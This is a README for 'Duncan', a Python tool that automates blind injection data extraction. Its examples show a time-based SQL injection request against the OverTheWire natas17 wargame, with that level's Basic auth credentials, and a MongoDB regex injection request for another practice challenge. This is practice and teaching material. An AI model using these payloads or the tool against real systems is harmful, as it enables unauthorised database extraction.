# Duncan
Duncan is a script which helps automate the extraction of data using blind injection techiques. It does not help you with finding these it just helps with some of the boring stuff

## Why?
I did a quite a few challenges and based around this and got bored writing similar scripts

## Installation
1. Git clone the repo
2. `pip install docopt`

## Usage
1. Capture a request using your method of choice (or just fabricate one in a text file). See below (Note: You need to put $$PAYLOAD$$ where you want the current extracted value inserting)
```
POST /index.php HTTP/1.1
Host: natas17.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://natas17.natas.labs.overthewire.org/
Cookie: __cfduid=d861fc1b6c46e687e61e35690b5f416611520867281; __utma=176859643.1818706855.1520867282.1520867282.1520867282.1; __utmb=176859643.2.10.1520867282; __utmc=176859643; __utmz=176859643.1520867282.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmt=1
Authorization: Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded

username=natas18%22+and+password+like+binary+%27$$PAYLOAD$$%25%27+and+sleep%281%29+%23
```
2. Run duncan providing the url to use, the request file, a character set to use and an expression (you have access to the http response object as the r value and it is a requests.Response object) to determine the sucess or failure of the extraction. Optional you can give a data length to extract

```
$ ./duncan.py -r natas17.txt -u http://natas17.natas.labs.overthewire.org -c alpha -l 32 -e "r.elapsed.seconds >= 1"
```
The above command will solve the natas17 level from overthewire.org
```
./duncan.py -r mongo.txt -u http://ptl-b4178f0b-d147a1d2.libcurl.so -c "-0123456789abcdef" -l 20 -e "'search=admin' in r.text"
```
The above command will solve a mongodb injection challenge. The request file for this is below and was handcrafted in a text editor
```
GET /?search=admin%27+%26%26+this.password.match(/^$$PAYLOAD$$.*$/)%00 HTTP/1.1
Host: ptl-b4178f0b-d147a1d2.libcurl.so
```